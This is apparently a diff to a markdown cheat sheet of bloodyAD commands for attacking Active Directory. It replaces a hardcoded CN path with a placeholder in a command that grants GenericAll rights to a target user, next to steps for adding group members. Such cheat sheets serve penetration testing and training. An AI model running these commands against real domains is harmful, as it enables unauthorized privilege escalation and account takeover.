@@ -7,7 +7,7 @@ bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSW
 
 ## 2. Add GenericAll
 ```
-bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' add genericAll "CN=<USER_NAME>,CN=Users,DC=<DOMAIN>,DC=<DOMAIN_EXT>" '<TARGET_USERNAME>'
+bloodyAD --host <DC_FQDN> -d '<DOMAIN>' --dc-ip <DC_IP> -u <USERNAME> -p '<PASSWORD>' add genericAll "<CN_PATH>" '<TARGET_USERNAME>'
 ```
 
 ## 3. Add GroupMember
